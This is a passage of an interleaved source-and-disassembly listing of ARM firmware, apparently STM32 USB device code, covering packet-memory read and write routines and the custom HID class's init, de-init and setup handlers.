 8008472:	623b      	str	r3, [r7, #32]

#if PMA_ACCESS > 1U
    pdwVal++;
#endif /* PMA_ACCESS */

    pBuf++;
 8008474:	69fb      	ldr	r3, [r7, #28]
 8008476:	3301      	adds	r3, #1
 8008478:	61fb      	str	r3, [r7, #28]
    pBuf++;
 800847a:	69fb      	ldr	r3, [r7, #28]
 800847c:	3301      	adds	r3, #1
 800847e:	61fb      	str	r3, [r7, #28]
  for (count = n; count != 0U; count--)
 8008480:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8008482:	3b01      	subs	r3, #1
 8008484:	627b      	str	r3, [r7, #36]	; 0x24
 8008486:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8008488:	2b00      	cmp	r3, #0
 800848a:	d1e0      	bne.n	800844e <USB_WritePMA+0x38>
  }
}
 800848c:	bf00      	nop
 800848e:	bf00      	nop
 8008490:	372c      	adds	r7, #44	; 0x2c
 8008492:	46bd      	mov	sp, r7
 8008494:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008498:	4770      	bx	lr

0800849a <USB_ReadPMA>:
  * @param   wPMABufAddr address into PMA.
  * @param   wNBytes no. of bytes to be copied.
  * @retval None
  */
void USB_ReadPMA(USB_TypeDef const *USBx, uint8_t *pbUsrBuf, uint16_t wPMABufAddr, uint16_t wNBytes)
{
 800849a:	b480      	push	{r7}
 800849c:	b08b      	sub	sp, #44	; 0x2c
 800849e:	af00      	add	r7, sp, #0
 80084a0:	60f8      	str	r0, [r7, #12]
 80084a2:	60b9      	str	r1, [r7, #8]
 80084a4:	4611      	mov	r1, r2
 80084a6:	461a      	mov	r2, r3
 80084a8:	460b      	mov	r3, r1
 80084aa:	80fb      	strh	r3, [r7, #6]
 80084ac:	4613      	mov	r3, r2
 80084ae:	80bb      	strh	r3, [r7, #4]
  uint32_t n = (uint32_t)wNBytes >> 1;
 80084b0:	88bb      	ldrh	r3, [r7, #4]
 80084b2:	085b      	lsrs	r3, r3, #1
 80084b4:	b29b      	uxth	r3, r3
 80084b6:	61bb      	str	r3, [r7, #24]
  uint32_t BaseAddr = (uint32_t)USBx;
 80084b8:	68fb      	ldr	r3, [r7, #12]
 80084ba:	617b      	str	r3, [r7, #20]
  uint32_t count;
  uint32_t RdVal;
  __IO uint16_t *pdwVal;
  uint8_t *pBuf = pbUsrBuf;
 80084bc:	68bb      	ldr	r3, [r7, #8]
 80084be:	61fb      	str	r3, [r7, #28]

  pdwVal = (__IO uint16_t *)(BaseAddr + 0x400U + ((uint32_t)wPMABufAddr * PMA_ACCESS));
 80084c0:	88fa      	ldrh	r2, [r7, #6]
 80084c2:	697b      	ldr	r3, [r7, #20]
 80084c4:	4413      	add	r3, r2
 80084c6:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 80084ca:	623b      	str	r3, [r7, #32]

  for (count = n; count != 0U; count--)
 80084cc:	69bb      	ldr	r3, [r7, #24]
 80084ce:	627b      	str	r3, [r7, #36]	; 0x24
 80084d0:	e018      	b.n	8008504 <USB_ReadPMA+0x6a>
  {
    RdVal = *(__IO uint16_t *)pdwVal;
 80084d2:	6a3b      	ldr	r3, [r7, #32]
 80084d4:	881b      	ldrh	r3, [r3, #0]
 80084d6:	b29b      	uxth	r3, r3
 80084d8:	613b      	str	r3, [r7, #16]
    pdwVal++;
 80084da:	6a3b      	ldr	r3, [r7, #32]
 80084dc:	3302      	adds	r3, #2
 80084de:	623b      	str	r3, [r7, #32]
    *pBuf = (uint8_t)((RdVal >> 0) & 0xFFU);
 80084e0:	693b      	ldr	r3, [r7, #16]
 80084e2:	b2da      	uxtb	r2, r3
 80084e4:	69fb      	ldr	r3, [r7, #28]
 80084e6:	701a      	strb	r2, [r3, #0]
    pBuf++;
 80084e8:	69fb      	ldr	r3, [r7, #28]
 80084ea:	3301      	adds	r3, #1
 80084ec:	61fb      	str	r3, [r7, #28]
    *pBuf = (uint8_t)((RdVal >> 8) & 0xFFU);
 80084ee:	693b      	ldr	r3, [r7, #16]
 80084f0:	0a1b      	lsrs	r3, r3, #8
 80084f2:	b2da      	uxtb	r2, r3
 80084f4:	69fb      	ldr	r3, [r7, #28]
 80084f6:	701a      	strb	r2, [r3, #0]
    pBuf++;
 80084f8:	69fb      	ldr	r3, [r7, #28]
 80084fa:	3301      	adds	r3, #1
 80084fc:	61fb      	str	r3, [r7, #28]
  for (count = n; count != 0U; count--)
 80084fe:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8008500:	3b01      	subs	r3, #1
 8008502:	627b      	str	r3, [r7, #36]	; 0x24
 8008504:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8008506:	2b00      	cmp	r3, #0
 8008508:	d1e3      	bne.n	80084d2 <USB_ReadPMA+0x38>
#if PMA_ACCESS > 1U
    pdwVal++;
#endif /* PMA_ACCESS */
  }

  if ((wNBytes % 2U) != 0U)
 800850a:	88bb      	ldrh	r3, [r7, #4]
 800850c:	f003 0301 	and.w	r3, r3, #1
 8008510:	b29b      	uxth	r3, r3
 8008512:	2b00      	cmp	r3, #0
 8008514:	d007      	beq.n	8008526 <USB_ReadPMA+0x8c>
  {
    RdVal = *pdwVal;
 8008516:	6a3b      	ldr	r3, [r7, #32]
 8008518:	881b      	ldrh	r3, [r3, #0]
 800851a:	b29b      	uxth	r3, r3
 800851c:	613b      	str	r3, [r7, #16]
    *pBuf = (uint8_t)((RdVal >> 0) & 0xFFU);
 800851e:	693b      	ldr	r3, [r7, #16]
 8008520:	b2da      	uxtb	r2, r3
 8008522:	69fb      	ldr	r3, [r7, #28]
 8008524:	701a      	strb	r2, [r3, #0]
  }
}
 8008526:	bf00      	nop
 8008528:	372c      	adds	r7, #44	; 0x2c
 800852a:	46bd      	mov	sp, r7
 800852c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008530:	4770      	bx	lr
	...

08008534 <USBD_CUSTOM_HID_Init>:
  * @param  pdev: device instance
  * @param  cfgidx: Configuration index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_Init(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008534:	b580      	push	{r7, lr}
 8008536:	b084      	sub	sp, #16
 8008538:	af00      	add	r7, sp, #0
 800853a:	6078      	str	r0, [r7, #4]
 800853c:	460b      	mov	r3, r1
 800853e:	70fb      	strb	r3, [r7, #3]
  UNUSED(cfgidx);
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)USBD_malloc(sizeof(USBD_CUSTOM_HID_HandleTypeDef));
 8008540:	2024      	movs	r0, #36	; 0x24
 8008542:	f004 fd05 	bl	800cf50 <USBD_static_malloc>
 8008546:	60f8      	str	r0, [r7, #12]

  if (hhid == NULL)
 8008548:	68fb      	ldr	r3, [r7, #12]
 800854a:	2b00      	cmp	r3, #0
 800854c:	d109      	bne.n	8008562 <USBD_CUSTOM_HID_Init+0x2e>
  {
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 800854e:	687b      	ldr	r3, [r7, #4]
 8008550:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008554:	687b      	ldr	r3, [r7, #4]
 8008556:	32b0      	adds	r2, #176	; 0xb0
 8008558:	2100      	movs	r1, #0
 800855a:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    return (uint8_t)USBD_EMEM;
 800855e:	2302      	movs	r3, #2
 8008560:	e08b      	b.n	800867a <USBD_CUSTOM_HID_Init+0x146>
  }

  pdev->pClassDataCmsit[pdev->classId] = (void *)hhid;
 8008562:	687b      	ldr	r3, [r7, #4]
 8008564:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008568:	687b      	ldr	r3, [r7, #4]
 800856a:	32b0      	adds	r2, #176	; 0xb0
 800856c:	68f9      	ldr	r1, [r7, #12]
 800856e:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
  pdev->pClassData = pdev->pClassDataCmsit[pdev->classId];
 8008572:	687b      	ldr	r3, [r7, #4]
 8008574:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008578:	687b      	ldr	r3, [r7, #4]
 800857a:	32b0      	adds	r2, #176	; 0xb0
 800857c:	f853 2022 	ldr.w	r2, [r3, r2, lsl #2]
 8008580:	687b      	ldr	r3, [r7, #4]
 8008582:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  /* Get the Endpoints addresses allocated for this class instance */
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_speed == USBD_SPEED_HIGH)
 8008586:	687b      	ldr	r3, [r7, #4]
 8008588:	7c1b      	ldrb	r3, [r3, #16]
 800858a:	2b00      	cmp	r3, #0
 800858c:	d11b      	bne.n	80085c6 <USBD_CUSTOM_HID_Init+0x92>
  {
    pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = CUSTOM_HID_HS_BINTERVAL;
 800858e:	4b3d      	ldr	r3, [pc, #244]	; (8008684 <USBD_CUSTOM_HID_Init+0x150>)
 8008590:	781b      	ldrb	r3, [r3, #0]
 8008592:	f003 020f 	and.w	r2, r3, #15
 8008596:	6879      	ldr	r1, [r7, #4]
 8008598:	4613      	mov	r3, r2
 800859a:	009b      	lsls	r3, r3, #2
 800859c:	4413      	add	r3, r2
 800859e:	009b      	lsls	r3, r3, #2
 80085a0:	440b      	add	r3, r1
 80085a2:	3326      	adds	r3, #38	; 0x26
 80085a4:	2205      	movs	r2, #5
 80085a6:	801a      	strh	r2, [r3, #0]
    pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = CUSTOM_HID_HS_BINTERVAL;
 80085a8:	4b37      	ldr	r3, [pc, #220]	; (8008688 <USBD_CUSTOM_HID_Init+0x154>)
 80085aa:	781b      	ldrb	r3, [r3, #0]
 80085ac:	f003 020f 	and.w	r2, r3, #15
 80085b0:	6879      	ldr	r1, [r7, #4]
 80085b2:	4613      	mov	r3, r2
 80085b4:	009b      	lsls	r3, r3, #2
 80085b6:	4413      	add	r3, r2
 80085b8:	009b      	lsls	r3, r3, #2
 80085ba:	440b      	add	r3, r1
 80085bc:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 80085c0:	2205      	movs	r2, #5
 80085c2:	801a      	strh	r2, [r3, #0]
 80085c4:	e01a      	b.n	80085fc <USBD_CUSTOM_HID_Init+0xc8>
  }
  else   /* LOW and FULL-speed endpoints */
  {
    pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = CUSTOM_HID_FS_BINTERVAL;
 80085c6:	4b2f      	ldr	r3, [pc, #188]	; (8008684 <USBD_CUSTOM_HID_Init+0x150>)
 80085c8:	781b      	ldrb	r3, [r3, #0]
 80085ca:	f003 020f 	and.w	r2, r3, #15
 80085ce:	6879      	ldr	r1, [r7, #4]
 80085d0:	4613      	mov	r3, r2
 80085d2:	009b      	lsls	r3, r3, #2
 80085d4:	4413      	add	r3, r2
 80085d6:	009b      	lsls	r3, r3, #2
 80085d8:	440b      	add	r3, r1
 80085da:	3326      	adds	r3, #38	; 0x26
 80085dc:	2205      	movs	r2, #5
 80085de:	801a      	strh	r2, [r3, #0]
    pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = CUSTOM_HID_FS_BINTERVAL;
 80085e0:	4b29      	ldr	r3, [pc, #164]	; (8008688 <USBD_CUSTOM_HID_Init+0x154>)
 80085e2:	781b      	ldrb	r3, [r3, #0]
 80085e4:	f003 020f 	and.w	r2, r3, #15
 80085e8:	6879      	ldr	r1, [r7, #4]
 80085ea:	4613      	mov	r3, r2
 80085ec:	009b      	lsls	r3, r3, #2
 80085ee:	4413      	add	r3, r2
 80085f0:	009b      	lsls	r3, r3, #2
 80085f2:	440b      	add	r3, r1
 80085f4:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 80085f8:	2205      	movs	r2, #5
 80085fa:	801a      	strh	r2, [r3, #0]
  }

  /* Open EP IN */
  (void)USBD_LL_OpenEP(pdev, CUSTOMHIDInEpAdd, USBD_EP_TYPE_INTR,
 80085fc:	4b21      	ldr	r3, [pc, #132]	; (8008684 <USBD_CUSTOM_HID_Init+0x150>)
 80085fe:	7819      	ldrb	r1, [r3, #0]
 8008600:	2302      	movs	r3, #2
 8008602:	2203      	movs	r2, #3
 8008604:	6878      	ldr	r0, [r7, #4]
 8008606:	f004 fa6f 	bl	800cae8 <USBD_LL_OpenEP>
                       CUSTOM_HID_EPIN_SIZE);

  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].is_used = 1U;
 800860a:	4b1e      	ldr	r3, [pc, #120]	; (8008684 <USBD_CUSTOM_HID_Init+0x150>)
 800860c:	781b      	ldrb	r3, [r3, #0]
 800860e:	f003 020f 	and.w	r2, r3, #15
 8008612:	6879      	ldr	r1, [r7, #4]
 8008614:	4613      	mov	r3, r2
 8008616:	009b      	lsls	r3, r3, #2
 8008618:	4413      	add	r3, r2
 800861a:	009b      	lsls	r3, r3, #2
 800861c:	440b      	add	r3, r1
 800861e:	3324      	adds	r3, #36	; 0x24
 8008620:	2201      	movs	r2, #1
 8008622:	801a      	strh	r2, [r3, #0]

  /* Open EP OUT */
  (void)USBD_LL_OpenEP(pdev, CUSTOMHIDOutEpAdd, USBD_EP_TYPE_INTR,
 8008624:	4b18      	ldr	r3, [pc, #96]	; (8008688 <USBD_CUSTOM_HID_Init+0x154>)
 8008626:	7819      	ldrb	r1, [r3, #0]
 8008628:	2302      	movs	r3, #2
 800862a:	2203      	movs	r2, #3
 800862c:	6878      	ldr	r0, [r7, #4]
 800862e:	f004 fa5b 	bl	800cae8 <USBD_LL_OpenEP>
                       CUSTOM_HID_EPOUT_SIZE);

  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].is_used = 1U;
 8008632:	4b15      	ldr	r3, [pc, #84]	; (8008688 <USBD_CUSTOM_HID_Init+0x154>)
 8008634:	781b      	ldrb	r3, [r3, #0]
 8008636:	f003 020f 	and.w	r2, r3, #15
 800863a:	6879      	ldr	r1, [r7, #4]
 800863c:	4613      	mov	r3, r2
 800863e:	009b      	lsls	r3, r3, #2
 8008640:	4413      	add	r3, r2
 8008642:	009b      	lsls	r3, r3, #2
 8008644:	440b      	add	r3, r1
 8008646:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 800864a:	2201      	movs	r2, #1
 800864c:	801a      	strh	r2, [r3, #0]

  hhid->state = CUSTOM_HID_IDLE;
 800864e:	68fb      	ldr	r3, [r7, #12]
 8008650:	2200      	movs	r2, #0
 8008652:	f883 2020 	strb.w	r2, [r3, #32]

  ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->Init();
 8008656:	687b      	ldr	r3, [r7, #4]
 8008658:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800865c:	687a      	ldr	r2, [r7, #4]
 800865e:	33b0      	adds	r3, #176	; 0xb0
 8008660:	009b      	lsls	r3, r3, #2
 8008662:	4413      	add	r3, r2
 8008664:	685b      	ldr	r3, [r3, #4]
 8008666:	685b      	ldr	r3, [r3, #4]
 8008668:	4798      	blx	r3

#ifndef USBD_CUSTOMHID_OUT_PREPARE_RECEIVE_DISABLED
  /* Prepare Out endpoint to receive 1st packet */
  (void)USBD_LL_PrepareReceive(pdev, CUSTOMHIDOutEpAdd, hhid->Report_buf,
 800866a:	4b07      	ldr	r3, [pc, #28]	; (8008688 <USBD_CUSTOM_HID_Init+0x154>)
 800866c:	7819      	ldrb	r1, [r3, #0]
 800866e:	68fa      	ldr	r2, [r7, #12]
 8008670:	230f      	movs	r3, #15
 8008672:	6878      	ldr	r0, [r7, #4]
 8008674:	f004 fbea 	bl	800ce4c <USBD_LL_PrepareReceive>
                               USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
#endif /* USBD_CUSTOMHID_OUT_PREPARE_RECEIVE_DISABLED */

  return (uint8_t)USBD_OK;
 8008678:	2300      	movs	r3, #0
}
 800867a:	4618      	mov	r0, r3
 800867c:	3710      	adds	r7, #16
 800867e:	46bd      	mov	sp, r7
 8008680:	bd80      	pop	{r7, pc}
 8008682:	bf00      	nop
 8008684:	200000a6 	.word	0x200000a6
 8008688:	200000a7 	.word	0x200000a7

0800868c <USBD_CUSTOM_HID_DeInit>:
  * @param  pdev: device instance
  * @param  cfgidx: Configuration index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DeInit(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 800868c:	b580      	push	{r7, lr}
 800868e:	b082      	sub	sp, #8
 8008690:	af00      	add	r7, sp, #0
 8008692:	6078      	str	r0, [r7, #4]
 8008694:	460b      	mov	r3, r1
 8008696:	70fb      	strb	r3, [r7, #3]
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  /* Close CUSTOM_HID EP IN */
  (void)USBD_LL_CloseEP(pdev, CUSTOMHIDInEpAdd);
 8008698:	4b37      	ldr	r3, [pc, #220]	; (8008778 <USBD_CUSTOM_HID_DeInit+0xec>)
 800869a:	781b      	ldrb	r3, [r3, #0]
 800869c:	4619      	mov	r1, r3
 800869e:	6878      	ldr	r0, [r7, #4]
 80086a0:	f004 fa60 	bl	800cb64 <USBD_LL_CloseEP>
  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].is_used = 0U;
 80086a4:	4b34      	ldr	r3, [pc, #208]	; (8008778 <USBD_CUSTOM_HID_DeInit+0xec>)
 80086a6:	781b      	ldrb	r3, [r3, #0]
 80086a8:	f003 020f 	and.w	r2, r3, #15
 80086ac:	6879      	ldr	r1, [r7, #4]
 80086ae:	4613      	mov	r3, r2
 80086b0:	009b      	lsls	r3, r3, #2
 80086b2:	4413      	add	r3, r2
 80086b4:	009b      	lsls	r3, r3, #2
 80086b6:	440b      	add	r3, r1
 80086b8:	3324      	adds	r3, #36	; 0x24
 80086ba:	2200      	movs	r2, #0
 80086bc:	801a      	strh	r2, [r3, #0]
  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = 0U;
 80086be:	4b2e      	ldr	r3, [pc, #184]	; (8008778 <USBD_CUSTOM_HID_DeInit+0xec>)
 80086c0:	781b      	ldrb	r3, [r3, #0]
 80086c2:	f003 020f 	and.w	r2, r3, #15
 80086c6:	6879      	ldr	r1, [r7, #4]
 80086c8:	4613      	mov	r3, r2
 80086ca:	009b      	lsls	r3, r3, #2
 80086cc:	4413      	add	r3, r2
 80086ce:	009b      	lsls	r3, r3, #2
 80086d0:	440b      	add	r3, r1
 80086d2:	3326      	adds	r3, #38	; 0x26
 80086d4:	2200      	movs	r2, #0
 80086d6:	801a      	strh	r2, [r3, #0]

  /* Close CUSTOM_HID EP OUT */
  (void)USBD_LL_CloseEP(pdev, CUSTOMHIDOutEpAdd);
 80086d8:	4b28      	ldr	r3, [pc, #160]	; (800877c <USBD_CUSTOM_HID_DeInit+0xf0>)
 80086da:	781b      	ldrb	r3, [r3, #0]
 80086dc:	4619      	mov	r1, r3
 80086de:	6878      	ldr	r0, [r7, #4]
 80086e0:	f004 fa40 	bl	800cb64 <USBD_LL_CloseEP>
  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].is_used = 0U;
 80086e4:	4b25      	ldr	r3, [pc, #148]	; (800877c <USBD_CUSTOM_HID_DeInit+0xf0>)
 80086e6:	781b      	ldrb	r3, [r3, #0]
 80086e8:	f003 020f 	and.w	r2, r3, #15
 80086ec:	6879      	ldr	r1, [r7, #4]
 80086ee:	4613      	mov	r3, r2
 80086f0:	009b      	lsls	r3, r3, #2
 80086f2:	4413      	add	r3, r2
 80086f4:	009b      	lsls	r3, r3, #2
 80086f6:	440b      	add	r3, r1
 80086f8:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 80086fc:	2200      	movs	r2, #0
 80086fe:	801a      	strh	r2, [r3, #0]
  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = 0U;
 8008700:	4b1e      	ldr	r3, [pc, #120]	; (800877c <USBD_CUSTOM_HID_DeInit+0xf0>)
 8008702:	781b      	ldrb	r3, [r3, #0]
 8008704:	f003 020f 	and.w	r2, r3, #15
 8008708:	6879      	ldr	r1, [r7, #4]
 800870a:	4613      	mov	r3, r2
 800870c:	009b      	lsls	r3, r3, #2
 800870e:	4413      	add	r3, r2
 8008710:	009b      	lsls	r3, r3, #2
 8008712:	440b      	add	r3, r1
 8008714:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 8008718:	2200      	movs	r2, #0
 800871a:	801a      	strh	r2, [r3, #0]

  /* Free allocated memory */
  if (pdev->pClassDataCmsit[pdev->classId] != NULL)
 800871c:	687b      	ldr	r3, [r7, #4]
 800871e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008722:	687b      	ldr	r3, [r7, #4]
 8008724:	32b0      	adds	r2, #176	; 0xb0
 8008726:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800872a:	2b00      	cmp	r3, #0
 800872c:	d01f      	beq.n	800876e <USBD_CUSTOM_HID_DeInit+0xe2>
  {
    ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->DeInit();
 800872e:	687b      	ldr	r3, [r7, #4]
 8008730:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008734:	687a      	ldr	r2, [r7, #4]
 8008736:	33b0      	adds	r3, #176	; 0xb0
 8008738:	009b      	lsls	r3, r3, #2
 800873a:	4413      	add	r3, r2
 800873c:	685b      	ldr	r3, [r3, #4]
 800873e:	689b      	ldr	r3, [r3, #8]
 8008740:	4798      	blx	r3
    USBD_free(pdev->pClassDataCmsit[pdev->classId]);
 8008742:	687b      	ldr	r3, [r7, #4]
 8008744:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008748:	687b      	ldr	r3, [r7, #4]
 800874a:	32b0      	adds	r2, #176	; 0xb0
 800874c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008750:	4618      	mov	r0, r3
 8008752:	f004 fc19 	bl	800cf88 <USBD_static_free>
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 8008756:	687b      	ldr	r3, [r7, #4]
 8008758:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800875c:	687b      	ldr	r3, [r7, #4]
 800875e:	32b0      	adds	r2, #176	; 0xb0
 8008760:	2100      	movs	r1, #0
 8008762:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    pdev->pClassData = NULL;
 8008766:	687b      	ldr	r3, [r7, #4]
 8008768:	2200      	movs	r2, #0
 800876a:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  }

  return (uint8_t)USBD_OK;
 800876e:	2300      	movs	r3, #0
}
 8008770:	4618      	mov	r0, r3
 8008772:	3708      	adds	r7, #8
 8008774:	46bd      	mov	sp, r7
 8008776:	bd80      	pop	{r7, pc}
 8008778:	200000a6 	.word	0x200000a6
 800877c:	200000a7 	.word	0x200000a7

08008780 <USBD_CUSTOM_HID_Setup>:
  * @param  req: usb requests
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_Setup(USBD_HandleTypeDef *pdev,
                                     USBD_SetupReqTypedef *req)
{
 8008780:	b580      	push	{r7, lr}
 8008782:	b088      	sub	sp, #32
 8008784:	af00      	add	r7, sp, #0
 8008786:	6078      	str	r0, [r7, #4]
 8008788:	6039      	str	r1, [r7, #0]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800878a:	687b      	ldr	r3, [r7, #4]
 800878c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008790:	687b      	ldr	r3, [r7, #4]
 8008792:	32b0      	adds	r2, #176	; 0xb0
 8008794:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008798:	613b      	str	r3, [r7, #16]
  uint16_t len = 0U;
 800879a:	2300      	movs	r3, #0
 800879c:	83fb      	strh	r3, [r7, #30]
#ifdef USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED
  uint16_t ReportLength = 0U;
#endif /* USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED */
  uint8_t  *pbuf = NULL;
 800879e:	2300      	movs	r3, #0
 80087a0:	61bb      	str	r3, [r7, #24]
  uint16_t status_info = 0U;
 80087a2:	2300      	movs	r3, #0
 80087a4:	81fb      	strh	r3, [r7, #14]
  USBD_StatusTypeDef ret = USBD_OK;
 80087a6:	2300      	movs	r3, #0
 80087a8:	75fb      	strb	r3, [r7, #23]

  if (hhid == NULL)
 80087aa:	693b      	ldr	r3, [r7, #16]
 80087ac:	2b00      	cmp	r3, #0
 80087ae:	d101      	bne.n	80087b4 <USBD_CUSTOM_HID_Setup+0x34>
  {
    return (uint8_t)USBD_FAIL;
 80087b0:	2303      	movs	r3, #3
 80087b2:	e0f8      	b.n	80089a6 <USBD_CUSTOM_HID_Setup+0x226>
  }

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 80087b4:	683b      	ldr	r3, [r7, #0]
 80087b6:	781b      	ldrb	r3, [r3, #0]
 80087b8:	f003 0360 	and.w	r3, r3, #96	; 0x60
 80087bc:	2b00      	cmp	r3, #0
 80087be:	d056      	beq.n	800886e <USBD_CUSTOM_HID_Setup+0xee>
 80087c0:	2b20      	cmp	r3, #32
 80087c2:	f040 80e8 	bne.w	8008996 <USBD_CUSTOM_HID_Setup+0x216>
  {
    case USB_REQ_TYPE_CLASS:
      switch (req->bRequest)
 80087c6:	683b      	ldr	r3, [r7, #0]
 80087c8:	785b      	ldrb	r3, [r3, #1]
 80087ca:	3b02      	subs	r3, #2
 80087cc:	2b09      	cmp	r3, #9
 80087ce:	d846      	bhi.n	800885e <USBD_CUSTOM_HID_Setup+0xde>
 80087d0:	a201      	add	r2, pc, #4	; (adr r2, 80087d8 <USBD_CUSTOM_HID_Setup+0x58>)
 80087d2:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80087d6:	bf00      	nop
 80087d8:	08008831 	.word	0x08008831
 80087dc:	0800880f 	.word	0x0800880f
 80087e0:	0800885f 	.word	0x0800885f
 80087e4:	0800885f 	.word	0x0800885f
 80087e8:	0800885f 	.word	0x0800885f
 80087ec:	0800885f 	.word	0x0800885f
 80087f0:	0800885f 	.word	0x0800885f
 80087f4:	08008841 	.word	0x08008841
 80087f8:	0800881f 	.word	0x0800881f
 80087fc:	08008801 	.word	0x08008801
      {
        case CUSTOM_HID_REQ_SET_PROTOCOL:
          hhid->Protocol = (uint8_t)(req->wValue);
 8008800:	683b      	ldr	r3, [r7, #0]
 8008802:	885b      	ldrh	r3, [r3, #2]
 8008804:	b2db      	uxtb	r3, r3
 8008806:	461a      	mov	r2, r3
 8008808:	693b      	ldr	r3, [r7, #16]
 800880a:	611a      	str	r2, [r3, #16]
          break;
 800880c:	e02e      	b.n	800886c <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_GET_PROTOCOL:
          (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->Protocol, 1U);
 800880e:	693b      	ldr	r3, [r7, #16]
 8008810:	3310      	adds	r3, #16
 8008812:	2201      	movs	r2, #1
 8008814:	4619      	mov	r1, r3
 8008816:	6878      	ldr	r0, [r7, #4]
 8008818:	f003 fd0e 	bl	800c238 <USBD_CtlSendData>
          break;
 800881c:	e026      	b.n	800886c <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_SET_IDLE:
          hhid->IdleState = (uint8_t)(req->wValue >> 8);
 800881e:	683b      	ldr	r3, [r7, #0]
 8008820:	885b      	ldrh	r3, [r3, #2]
 8008822:	0a1b      	lsrs	r3, r3, #8
 8008824:	b29b      	uxth	r3, r3
 8008826:	b2db      	uxtb	r3, r3
 8008828:	461a      	mov	r2, r3
 800882a:	693b      	ldr	r3, [r7, #16]
 800882c:	615a      	str	r2, [r3, #20]
          break;
 800882e:	e01d      	b.n	800886c <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_GET_IDLE:
          (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->IdleState, 1U);
 8008830:	693b      	ldr	r3, [r7, #16]
 8008832:	3314      	adds	r3, #20
 8008834:	2201      	movs	r2, #1
 8008836:	4619      	mov	r1, r3
 8008838:	6878      	ldr	r0, [r7, #4]
 800883a:	f003 fcfd 	bl	800c238 <USBD_CtlSendData>
          break;
 800883e:	e015      	b.n	800886c <USBD_CUSTOM_HID_Setup+0xec>
            ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->CtrlReqComplete(req->bRequest,
                                                                                            req->wLength);
          }
#endif /* USBD_CUSTOMHID_CTRL_REQ_COMPLETE_CALLBACK_ENABLED */
#ifndef USBD_CUSTOMHID_EP0_OUT_PREPARE_RECEIVE_DISABLED
          hhid->IsReportAvailable = 1U;
 8008840:	693b      	ldr	r3, [r7, #16]
 8008842:	2201      	movs	r2, #1
 8008844:	61da      	str	r2, [r3, #28]
          (void)USBD_CtlPrepareRx(pdev, hhid->Report_buf,
